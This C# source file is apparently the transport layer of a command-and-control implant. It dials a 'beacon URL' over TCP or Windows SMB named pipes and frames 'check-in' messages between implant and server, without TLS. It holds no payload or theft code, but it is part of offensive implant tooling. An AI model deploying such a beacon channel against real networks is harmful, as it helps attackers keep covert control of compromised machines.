using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using Rod.V1;

namespace Rod.Implant.Internal;

// The socket family's shared wire (architecture.md Sec 8): the dial and the
// message framing both socket clients ride -- the poll client's one exchange
// per connection and the stream client's held session speak the same
// self-delimited messages over the same dial, so the wire lives in its own
// module file and both clients compile it in.

/// <summary>
/// The socket wire: one duplex stream over the dial the URL names -- a TCP
/// socket for tcp://host:port, a named pipe for smb://host/pipe/name (a dot
/// host is the local machine; a remote host is the Windows SMB pipe share)
/// -- carrying the stream check-in framing: one self-delimited message per
/// direction turn, a varint byte length then the envelope's delimited frame
/// sequence. No TLS and no client certificate ride it: the identity is the
/// id in the handshake (architecture.md Sec 8, the certificate-less
/// posture), so the segment's own reach is the boundary.
/// </summary>
internal sealed class SocketWire : IDisposable
{
    // The message budget: the envelope's wire-body cap, the same ceiling the
    // poll bridges enforce on a check-in message.
    private const int MaxMessageBytes = 16 * 1024 * 1024;

    // How long the dial itself may take: a poll cycle is bounded, and a
    // segment that cannot reach the endpoint fails the cycle, not the run.
    private static readonly TimeSpan ConnectTimeout = TimeSpan.FromSeconds(10);

    private readonly TcpClient? _client;
    private readonly Stream _stream;

    private SocketWire(TcpClient? client, Stream stream)
    {
        _client = client;
        _stream = stream;
    }

    /// <summary>Dials the socket beacon URL: the TCP or named-pipe endpoint it names.</summary>
    public static async Task<SocketWire> ConnectAsync(string beaconUrl, CancellationToken cancellationToken)
    {
        var uri = new Uri(beaconUrl);
        if (uri.Scheme.Equals("tcp", StringComparison.OrdinalIgnoreCase))
        {
            IPAddress[] addresses;
            if (IPAddress.TryParse(uri.Host, out var parsed))
                addresses = new[] { parsed };
            else
                addresses = await Dns.GetHostAddressesAsync(uri.Host, cancellationToken);
            var address = addresses.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)
                ?? addresses[0];

            using var bounded = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            bounded.CancelAfter(ConnectTimeout);
            var client = new TcpClient();
            try
            {
                await client.ConnectAsync(address, uri.Port, bounded.Token).ConfigureAwait(false);
                return new SocketWire(client, client.GetStream());
            }
            catch
            {
                client.Dispose();
                throw;
            }
        }

        if (uri.Scheme.Equals("smb", StringComparison.OrdinalIgnoreCase))
        {
            // smb://host/pipe/name: the UNC pipe path in URL form. A dot
            // (or empty) host is the local machine -- the shape a Unix dial
            // resolves and the one a listener on the same host serves; a
            // named host is the Windows SMB pipe share.
            var host = uri.Host.Length == 0 ? "." : uri.Host;
            var path = uri.AbsolutePath.TrimStart('/');
            const string pipePrefix = "pipe/";
            if (!path.StartsWith(pipePrefix, StringComparison.OrdinalIgnoreCase) || path.Length <= pipePrefix.Length)
                throw new InvalidOperationException(
                    $"the smb dial names no pipe: {beaconUrl} (expected smb://host/pipe/name)");
            var pipe = new NamedPipeClientStream(
                host, path[pipePrefix.Length..], PipeDirection.InOut, PipeOptions.Asynchronous);
            try
            {
                using var bounded = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
                bounded.CancelAfter(ConnectTimeout);
                await pipe.ConnectAsync((int)ConnectTimeout.TotalMilliseconds, bounded.Token).ConfigureAwait(false);
                return new SocketWire(null, pipe);
            }
            catch
            {
                pipe.Dispose();
                throw;
            }
        }

        throw new InvalidOperationException($"the socket dial names an unknown scheme: {beaconUrl}");
    }

    /// <summary>Writes one message body, varint-length-prefixed.</summary>
    public async Task WriteBodyAsync(byte[] body, CancellationToken cancellationToken)
    {
        var prefix = new byte[5];
        var value = (ulong)body.Length;
        var index = 0;
        while (value >= 0x80)
        {
            prefix[index++] = (byte)(value | 0x80);
            value >>= 7;
        }
        prefix[index++] = (byte)value;

        await _stream.WriteAsync(prefix.AsMemory(0, index), cancellationToken).ConfigureAwait(false);
        if (body.Length > 0)
            await _stream.WriteAsync(body, cancellationToken).ConfigureAwait(false);
        await _stream.FlushAsync(cancellationToken).ConfigureAwait(false);
    }

    /// <summary>Writes one message: the frames, varint-length-prefixed.</summary>
    public Task WriteFramesAsync(IReadOnlyList<Frame> frames, CancellationToken cancellationToken)
        => WriteBodyAsync(EnvelopeCodec.Encode(frames), cancellationToken);

    /// <summary>
    /// Reads one message body. A clean close reads as an empty body; a
    /// malformed or oversized message throws, dropping the connection.
    /// </summary>
    public async Task<byte[]> ReadBodyAsync(CancellationToken cancellationToken)
    {
        long length = 0;
        var shift = 0;
        while (true)
        {
            var one = new byte[1];
            if (await _stream.ReadAsync(one.AsMemory(), cancellationToken).ConfigureAwait(false) <= 0)
                return Array.Empty<byte>();
            length |= (long)(one[0] & 0x7f) << shift;
            if ((one[0] & 0x80) == 0)
                break;
            shift += 7;
            if (shift > 28)
                throw new InvalidOperationException("check-in length prefix is a malformed varint");
        }
        if (length > MaxMessageBytes)
            throw new InvalidOperationException("check-in message exceeds the body budget");

        var body = new byte[length];
        var offset = 0;
        while (offset < length)
        {
            var read = await _stream.ReadAsync(body.AsMemory(offset), cancellationToken).ConfigureAwait(false);
            if (read <= 0)
                throw new InvalidOperationException("the stream closed mid-message");
            offset += read;
        }
        return body;
    }

    /// <summary>
    /// Reads one message and parses its frames. A clean close reads as an
    /// empty list; a malformed or oversized body throws, dropping the
    /// connection.
    /// </summary>
    public async Task<IReadOnlyList<Frame>> ReadFramesAsync(CancellationToken cancellationToken)
        => EnvelopeCodec.Parse(await ReadBodyAsync(cancellationToken).ConfigureAwait(false));

    public void Dispose()
    {
        _stream.Dispose();
        _client?.Dispose();
    }
}
